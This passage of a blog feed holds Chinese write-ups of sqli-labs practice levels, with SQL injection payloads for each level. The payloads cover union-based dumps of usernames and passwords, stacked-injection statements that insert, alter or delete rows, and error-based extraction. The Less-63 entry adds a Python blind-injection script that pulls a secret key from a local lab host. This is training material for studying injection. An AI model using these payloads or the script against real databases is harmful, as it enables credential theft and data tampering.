punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less41</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less41/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less41/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>数字型，存在堆叠注入 <a name="fu7F3"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入，<strong>修改</strong>回Dumb账户原来的密码&amp;#x20;<br><code>?id=1')**; update** security.users set password='Dumb' where username='Dumb'--+</code><br>查询看是发现Dumb账户的密码变成了 ‘Dumb’<br><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456</p></blockquote><p>修改回去密码成功。 <a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code>没有报错提示<br><code>?id=1 and 1=1</code>显示正常<br>数字型注入 <a name="eZFGx"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">4</span>--+ ?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>--+ 找回显点?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,3--+  爆破数据库名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less40</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less40/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less40/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>闭合方式为**’)**。依旧存在堆叠注入 <a name="PPyxl"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入，<strong>修改</strong>Dumb账户的密码&amp;#x20;<br><code>?id=1')**; update** security.users set password='xiugai' where username='Dumb'--+</code></p><p>查询看是发现Dumb账户的密码变成了 ‘xiugai’<br><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>xiugai,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456</p></blockquote><p>密码修改成功 <a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code></p><p><code>?id=1') or 1=('1</code>闭合<br>闭合方式是单引号加括号**’)**</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') order by 4--+ ?id=1'</span><span class="token punctuation">)</span> order by <span class="token number">3</span>--+ 找回显点?id<span class="token operator">=</span>-1<span class="token string">') union select 1,2,3--+  爆破数据库名称?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1<span class="token string">') union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+爆破字段名称?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1'<span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less39</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less39/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less39/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注入方式为<strong>数字型注入</strong>，依旧存在<strong>堆叠注入</strong>  。</p><p><a name="s6XR3"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入,<strong>删除</strong>上一关卡我们增添的数据&amp;#x20;<br><code>?id=1;**delete** from users where username='duidie'--+</code></p><p>查询看是否存在 发现’duidie’这条数据的账户和密码都没有了 &amp;#x20;<br><code>?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456</p></blockquote><p><a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p></blockquote><p>数字型注入。</p><p><a name="PF74E"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">4</span>--+ ?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>--+找回显点?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,3--+  爆破数据库名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less46</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>Please input parameter as SORT with numeric value<br>请将参数输入为SORT，并输入数值</p></blockquote><p><a name="l0NTO"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1</code></p><table><thead><tr><th>ID</th><th>USERNAME</th><th>PASSWORD</th></tr></thead><tbody><tr><td>1</td><td>Dumb</td><td>Dumb</td></tr><tr><td>2</td><td>Angelina</td><td>I-kill-you</td></tr><tr><td>3</td><td>Dummy</td><td>p@ssword</td></tr><tr><td>4</td><td>secure</td><td>crappy</td></tr><tr><td>5</td><td>stupid</td><td>stupidity</td></tr><tr><td>6</td><td>superman</td><td>genious</td></tr><tr><td>7</td><td>batman</td><td>mob!le</td></tr><tr><td>8</td><td>admin</td><td>1234</td></tr><tr><td>9</td><td>admin1</td><td>admin1</td></tr><tr><td>10</td><td>admin2</td><td>admin2</td></tr><tr><td>11</td><td>admin3</td><td>admin3</td></tr><tr><td>12</td><td>dhakkan</td><td>dumbo</td></tr><tr><td>14</td><td>admin4</td><td>admin4</td></tr><tr><td>15</td><td>admin’– +</td><td>123456</td></tr></tbody></table><p><code>?sort=2</code><br>可看出传入的参数。类似于ordey by 按列排序的作用 &amp;#x20;<br><code>?sort=4</code></p><blockquote><p>Unknown column ‘4’ in ‘order clause’</p></blockquote><p><a name="gX6OV"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破数据表?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less38</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>** mysqli_multi_query()<strong>这个函数可以实现针对数据库一条或多多条数据的操作<br>这就导致可能产生</strong>堆叠注入<strong>的存在，<br>堆叠注入可以实现</strong>数据的增删改查**，木马的写入，甚至直接破坏,升格数据库 <a name="cmHrI"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>插入一条数据在users字段中,两条不同sql语句用 分号隔开 <strong>；</strong>&amp;#x20;<br><code>?id=1'**;** insert into users(username,password)values('duidie','duidiezhuru')--+</code> &amp;#x20;<br>&amp;#x20;数据插入后页面没有回显，通过查询查看<br><code>id=-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456,duidie~duidiezhuru</p></blockquote><p>添加数据成功 <a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>单引号’闭合 <a name="PF74E"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' order by 4--+ ?id=1'</span> order by <span class="token number">3</span>--+找回显点?id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,3--+  爆破数据库名称?id=-1'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+爆破字段名称?id=-1'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less63</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/less63/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/less63/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式为字符型，单引号闭合，<br>需要使用盲注逐个猜解，SQLmap在130次内可能难以获得通关密码，<br>最好用轻量级的脚本获取</p><p><code>?id=1' and 1=2--+</code><br><code>?id=1' and 1=1--+</code></p><p>python脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/python3</span><span class="token comment"># -*-coding:utf-8-*-</span><span class="token function">import</span> re<span class="token function">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://192.168.31.193/Less-63/?id=1"</span>  <span class="token comment"># 改成你的地址</span>try_count <span class="token operator">=</span> <span class="token number">0</span>def extract_bits<span class="token punctuation">(</span>query, i, bit_values: list<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query执行结果的第 i 个（从1开始算）字符的3个比特    哪3个比特由bit_values指定    <span class="token string">""</span>"    global try_count    assert len<span class="token punctuation">(</span>bit_values<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span>    bit_marks <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">v</span> <span class="token keyword">in</span> bit_values:        bit_marks <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">v</span>    payload <span class="token operator">=</span> <span class="token string">""</span>"    <span class="token string">'+(SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) &amp; ({bit_mark})    WHEN {0} THEN 1    WHEN {1} THEN 2    WHEN {2} THEN 3    WHEN {3} THEN 4    WHEN {4} THEN 5    WHEN {5} THEN 6    WHEN {6} THEN 7    ELSE 8END)+'</span>    <span class="token string">""</span>".format<span class="token punctuation">(</span>*bit_values<span class="token punctuation">[</span>:7<span class="token punctuation">]</span>, <span class="token assign-left variable">query</span><span class="token operator">=</span>query, <span class="token assign-left variable">bit_mark</span><span class="token operator">=</span>bit_marks, <span class="token assign-left variable">i</span><span class="token operator">=</span>i<span class="token punctuation">)</span>    payload <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">'\s+'</span>, <span class="token string">' '</span>, payload.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">" "</span><span class="token punctuation">))</span>    <span class="token comment"># print(payload)</span>    resp <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url, <span class="token assign-left variable">params</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token builtin class-name">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>    try_count <span class="token operator">+=</span> <span class="token number">1</span>    infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Angelina"</span>, <span class="token string">"Dummy"</span>, <span class="token string">"secure"</span>, <span class="token string">"stupid"</span>, <span class="token string">"superman"</span>, <span class="token string">"batman"</span>, <span class="token string">"admin"</span>, <span class="token string">"admin1"</span><span class="token punctuation">]</span>    match <span class="token operator">=</span> re.search<span class="token punctuation">(</span>r<span class="token string">"Your Login name : (.*?)&lt;br&gt;"</span>, resp.text<span class="token punctuation">)</span>    assert match    assert match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">in</span> infos    bits <span class="token operator">=</span> bit_values<span class="token punctuation">[</span>infos.index<span class="token punctuation">(</span>match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token punctuation">]</span>    <span class="token builtin class-name">return</span> bitsdef extract_data<span class="token punctuation">(</span>query, length<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query查询结果的length个字符，每个字符只获取其第7位和前5位    <span class="token string">""</span>"    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span>, length+1<span class="token punctuation">)</span>:        b2 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 00000111</span>        b1 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 01011000</span>        <span class="token keyword">if</span> b1 <span class="token operator">&amp;</span> 0b01000000 <span class="token operator">==</span> <span class="token number">0</span>:            <span class="token comment"># 该字符为数字</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2 <span class="token operator">|</span> 0b00100000        else:            <span class="token comment"># 该字符为字母</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    <span class="token builtin class-name">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>    table_name <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1"</span>, <span class="token number">10</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"table_name:"</span>, table_name<span class="token punctuation">)</span>    secret_key <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x"</span> % table_name, <span class="token number">24</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"secret_key:"</span>, secret_key<span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"Done. try_count:"</span>, try_count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>└─<span class="token comment"># python3 1.py</span>table_name: 50MB3MQNDSsecret_key: NJ3L1WZTKRVPKNLU55LFORLLDone. try_count: <span class="token number">68</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less61</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less61/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less61/</url>
      
